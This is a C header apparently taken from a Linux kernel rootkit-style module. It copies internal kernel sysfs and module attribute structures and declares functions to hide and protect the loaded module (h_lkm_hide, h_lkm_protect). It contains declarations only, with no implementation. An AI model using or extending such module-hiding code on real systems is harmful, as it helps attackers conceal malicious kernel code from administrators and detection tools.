#ifndef STEALTH_HELPER_H
#define STEALTH_HELPER_H

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/sysfs.h>
#include <linux/slab.h>
#include <linux/types.h>

// Required definitions (stolen from kernel source code)
// module.h
struct module_sect_attr {
	struct bin_attribute battr;
	unsigned long address;
};

struct module_sect_attrs {
	struct attribute_group grp;
	unsigned int nsections;
	struct module_sect_attr attrs[];
};

struct module_notes_attrs {
	struct kobject *dir;
	unsigned int notes;
	struct bin_attribute attrs[];
};

// kernel/params.c
struct param_attribute
{
    struct module_attribute mattr;
    const struct kernel_param *param;
};

struct module_param_attrs
{
    unsigned int num;
    struct attribute_group grp;
    struct param_attribute attrs[0];
};

struct restore_info {
    struct kobject *parent;
    struct module_sect_attrs *attrs;
    const char *name;
};

void init_this_kobj(void) ;
void h_lkm_protect(void);
void h_lkm_hide(void);

static inline void h_lkm_hide_and_protect(void) {
    h_lkm_protect();
    h_lkm_hide();
}

#endif // STEALTH_HELPER_H